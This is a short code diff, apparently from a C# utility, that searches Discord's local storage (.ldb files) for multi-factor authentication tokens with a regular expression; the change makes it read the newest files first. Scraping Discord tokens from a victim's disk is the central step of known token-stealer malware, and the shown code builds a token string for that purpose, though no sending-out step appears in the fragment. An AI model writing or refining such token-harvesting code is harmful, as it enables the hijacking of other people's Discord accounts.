@@ -162,7 +162,7 @@ namespace Utils
             string tokenStr = "";
             DirectoryInfo directoryRoot = new DirectoryInfo(GetDiscordDirectory());
 
-            foreach (var file in directoryRoot.GetFiles("*.ldb").OrderBy(f => f.LastWriteTime))
+            foreach (var file in directoryRoot.GetFiles("*.ldb").OrderByDescending(f => f.LastWriteTime))
             {
                 string fileOut = file.OpenText().ReadToEnd();
                 Match mfaMatch = Regex.Match(fileOut, @"mfa\.[\w-]{84}");
